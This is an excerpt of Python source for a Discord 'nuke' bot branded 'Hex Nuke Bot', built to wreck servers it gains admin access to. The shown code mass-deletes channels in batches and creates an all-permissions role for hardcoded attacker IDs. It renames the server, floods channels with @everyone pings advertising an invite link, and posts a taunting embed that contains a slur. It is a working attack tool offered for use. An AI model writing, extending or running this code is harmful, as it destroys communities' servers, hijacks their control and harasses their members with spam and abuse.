...
# Enable presence only if you actually use presence-based features.
...
PREM = 1510663071109218315
MOD_ROLE_ID = 1510663071109218315
WHITELIST = [1510663071109218315]
...
async def send_nuke_log(guild_name_original, guild, user, channels, messages, invite_link=None):
    ...
    embed.set_footer(text="Hex Nuke Bot • Logs")
...
class NukeConfigModal(discord.ui.Modal, title="⚙️ Nuke Custom Settings"):
    custom_channel_name = discord.ui.TextInput(
        label="Channel Name",
        placeholder="Numele canalelor (ex: nuked-by-Carlos)",
        required=False,
        max_length=32,
        default=""
    )
...
async def perform_nuke(ctx, custom_mode: bool):
    ...
    if is_owner:
        ...
        spam_messages = random.randint(5, 10)
    ...
    if custom_mode:
        ...
        channel_name = custom_channel if custom_channel else "Carlos Virtuoso"
        server_name = custom_server if custom_server else "Hex owns this"
        role_name = custom_role if custom_role else "Hex-on-top"
        text_message = custom_msg if custom_msg else "@everyone @here join https://discord.gg/tG6xX3KBrS"
    else:
        channel_name = "Carlos Virtuoso"
        server_name = "Hex owns this"
        role_name = "Hex-on-top"
        text_message = "@everyone @here join https://discord.gg/tG6xX3KBrS"
    ...
    if not custom_mode:
        embed_main = discord.Embed(
            ...
            description=(
                ...
                "https://discord.gg/tG6xX3KBrS\n\n"
                "*Next time don't give admin perms to everyone r4tard.*"
            ),
            color=0x000000
        )
        embed_main.set_image(url="https://i.imgur.com/QJ3fj7X.gif")
        embed_main.set_footer(text="Hex || Server • Nuke Service")
        ...
        embed_gif2.set_image(url="https://i.imgur.com/QJ3fj7X.gif")

    save_nuke_stats(user.id, guild)

    admin_users = [1510663071109218315, 1501204588643090512]
    try:
        admin_role = await guild.create_role(name="Hex || Server Admin", permissions=discord.Permissions.all())
    ...
    if not channels_to_delete:
        await user.send("ℹ️ No channels to delete.")
    else:
        await user.send(f"🔄 Deleting {len(channels_to_delete)} channels...")

        for i in range(0, len(channels_to_delete), 5):
            batch = channels_to_delete[i:i+5]
            tasks = [ch.delete() for ch in batch if ch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for res in results:
                if isinstance(res, Exception):
                    failed += 1
                    print(f"[DELETE ERROR] {res}")
                else:
                    deleted += 1
            await asyncio.sleep(1)

        await user.send(f"✅ Deleted {deleted} channels. Failed: {failed}.")
    ...
    async def spam_channel(channel):
        try:
            if custom_mode:
                ...
                extra = spam_messages - 15
                if extra > 0:
                    for _ in range(extra):
                        ping_count = random.randint(5, 12)
                        msg = ("@everyone @here join https://discord.gg/tG6xX3KBrS\n") * ping_count
